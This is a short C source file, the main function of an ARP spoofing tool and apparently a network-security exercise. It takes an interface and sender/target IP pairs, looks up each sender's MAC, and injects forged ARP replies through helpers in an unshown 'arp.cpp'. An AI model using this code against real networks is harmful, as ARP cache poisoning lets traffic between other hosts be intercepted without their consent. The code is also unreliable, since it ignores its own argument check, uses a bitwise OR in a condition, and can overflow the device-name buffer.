#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <pcap.h>
#include <pcap/pcap.h>
#include <net/if.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <ifaddrs.h>
#include <unistd.h>
#include <pthread.h>
#include "arp.cpp"

int main(int argc, char* argv[])
{
    if (argc < 4 | argc % 2 != 0){
        printf("Error! Please check your input :)\n");
    }
    int number_of_infolist = (argc - 2)/2;
    info *infolist = (info*)malloc(sizeof (info) * number_of_infolist);
    uint8_t attackerIP[4];
    uint8_t attackerMAC[6];
    char dev[10] = {'\0',};
    strncpy(dev, argv[1],strlen(argv[1]));
    local_info_setting(dev, attackerIP, attackerMAC);

    for(int i = 0; i < number_of_infolist; i++){
        uint8_t senderMAC[6];
        uint8_t senderIP[4];
        uint8_t targetIP[4];
        infolist[i].sender_ip = inet_addr(argv[2*(i+1)]);   //sender ip
        infolist[i].target_ip = inet_addr(argv[2*(i+1) + 1]);   //target ip
        memcpy(senderIP, &infolist[i].sender_ip, sizeof(uint32_t));
        Get_senderMAC(dev, senderIP, senderMAC);
        memcpy(targetIP, &infolist[i].target_ip, sizeof(uint32_t));
        inject_ARP_sender(dev,senderIP,targetIP,senderMAC);
        memset(senderIP, 0x00, 4);
        memset(targetIP, 0x00, 4);
    }

}
